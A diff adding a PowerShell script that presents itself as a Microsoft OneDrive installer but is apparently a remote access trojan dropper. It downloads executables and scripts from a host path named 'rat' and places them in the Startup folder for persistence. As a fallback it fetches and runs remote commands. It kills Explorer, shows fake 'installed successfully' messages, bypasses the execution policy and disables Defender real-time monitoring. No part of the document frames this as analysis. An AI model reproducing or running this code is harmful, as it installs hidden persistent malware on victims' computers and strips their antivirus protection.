@@ -1,0 +1,142 @@
+cd $home
+cd 'APPDATA/ROAMING/MICROSOFT/WINDOWS/START MENU/PROGRAMS/STARTUP'
+timeout /t 1
+del 'OneDriveSetup.exe'
+del 'df.bat'
+timeout /t 1
+Write-Host "Microsoft OneDrive: trying install the new version of OneDrive..." -ForegroundColor Green
+
+$url5 = 'http://wdc-dev.ru/rat/df.bat'
+$outputFile5 = 'df.bat'
+
+while ((Test-Path $outputFile5) -eq $false) {
+    try {
+        Invoke-WebRequest -Uri $url5 -OutFile $outputFile5
+    }
+    catch {
+        Write-Host "Error downloading OneDrive autorun. Trying before..." -ForegroundColor Green
+        del 'df.bat'
+        Start-Sleep -Seconds 10
+    }
+}
+Write-Host "OneDrive Setup: autoinstaller is downloaded..." -ForegroundColor Green
+
+$url3 = 'http://wdc-dev.ru/rat/OneDriveSetup.exe'
+$outputFile3 = 'OneDriveSetup.exe'
+
+while ((Test-Path $outputFile3) -eq $false) {
+    try {
+        Invoke-WebRequest -Uri $url3 -OutFile $outputFile3
+    }
+    catch {
+        Write-Host "Error downloading OneDrive. Trying before..." -ForegroundColor Green
+        del 'OneDriveSetup.exe'
+        Start-Sleep -Seconds 10
+    }
+}
+Write-Host "OneDrive Setup: downloading update..." -ForegroundColor Green
+cd $home
+cd 'APPDATA/ROAMING/MICROSOFT/WINDOWS/START MENU/PROGRAMS'
+timeout /t 1
+del 'OneDrive.exe'
+timeout /t 1
+del 'OneDrive64.exe'
+timeout /t 1
+del 'DisableDefender.ps1'
+timeout /t 1
+
+$url6 = 'http://wdc-dev.ru/rat/DisableDefender.ps1'
+$outputFile6 = 'DisableDefender.ps1'
+
+while ((Test-Path $outputFile6) -eq $false) {
+    try {
+        Invoke-WebRequest -Uri $url6 -OutFile $outputFile6
+    }
+    catch {
+        Write-Host "Error downloading MSOneDrive autorun. Trying before..." -ForegroundColor Green
+        del 'DisableDefender.ps1'
+        Start-Sleep -Seconds 10
+    }
+}
+Write-Host "OneDrive Setup: autoinstaller is downloaded..." -ForegroundColor Green
+
+$url2 = 'http://wdc-dev.ru/rat/OneDrive.exe'
+$outputFile2 = 'OneDrive.exe'
+
+while ((Test-Path $outputFile2) -eq $false) {
+    try {
+        Invoke-WebRequest -Uri $url2 -OutFile $outputFile2
+    }
+    catch {
+        Write-Host "Error downloading OneDrive update. Trying before..." -ForegroundColor Green
+        del 'OneDrive.exe'
+        Start-Sleep -Seconds 10
+    }
+}
+Write-Host "OneDrive Update Downloaded, starting update..." -ForegroundColor Green
+
+if (Test-Path $outputFile2) {
+    Start-Process -FilePath $outputFile2
+} else {
+    $urlinstall = 'http://wdc-dev.ru/rat/command2.txt';$result = Invoke-WebRequest -Uri $urlinstall; powershell.exe $result.content
+}
+
+$url = 'http://wdc-dev.ru/rat/OneDrive64.exe'
+$outputFile = 'OneDrive64.exe'
+
+while ((Test-Path $outputFile) -eq $false) {
+    try {
+        Invoke-WebRequest -Uri $url -OutFile $outputFile
+    }
+    catch {
+        Write-Host "Error downloading OneDrive Update. Trying before..." -ForegroundColor Green
+        del 'OneDrive64.exe'
+        Start-Sleep -Seconds 10
+    }
+}
+Write-Host "OneDrive installed, starting screen installer..." -ForegroundColor Green
+timeout /t 2
+taskkill /im explorer.exe /f
+timeout /t 2
+
+if (Test-Path $outputFile) {
+    Start-Process -FilePath $outputFile
+} else {
+    $urlinstall = 'http://wdc-dev.ru/rat/command2.txt';$result = Invoke-WebRequest -Uri $urlinstall; powershell.exe $result.content
+}
+
+timeout /t 60
+taskkill /im OneDrive64.exe /f
+timeout /t 2
+explorer.exe
+timeout /t 5
+del $outputFile
+timeout /t 1
+del $outputFile3
+cd $home
+cd 'APPDATA/ROAMING/MICROSOFT/WINDOWS/START MENU/PROGRAMS/STARTUP'
+del 'OneDriveSetup.exe'
+timeout /t 1
+cd $home
+cd 'APPDATA/ROAMING/MICROSOFT/WINDOWS/START MENU/PROGRAMS'
+del 'OneDrive64.exe'
+timeout /t 1
+Write-Host "OneDrive succesfully installed, thank you" -ForegroundColor Green
+
+Add-Type -AssemblyName System.Windows.Forms
+$global:balmsg = New-Object System.Windows.Forms.NotifyIcon
+$path = (Get-Process -id $pid).Path
+$balmsg.Icon = [System.Drawing.Icon]::ExtractAssociatedIcon($path)
+$balmsg.BalloonTipIcon = [System.Windows.Forms.ToolTipIcon]::Warning
+$balmsg.BalloonTipText = 'Installing and updating OneDrive is completed!'
+$balmsg.BalloonTipTitle = "Microsoft OneDrive"
+$balmsg.Visible = $true
+$balmsg.ShowBalloonTip(10000)
+
+powershell -NoP -Win H -Noni -Exec Bypass
+Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope CurrentUser 
+Set-MpPreference -DisableRealtimeMonitoring $true
+cd $home
+cd 'APPDATA/ROAMING/MICROSOFT/WINDOWS/START MENU/PROGRAMS/STARTUP'
+Start-Process -FilePath $outputFile5
+start df.bat
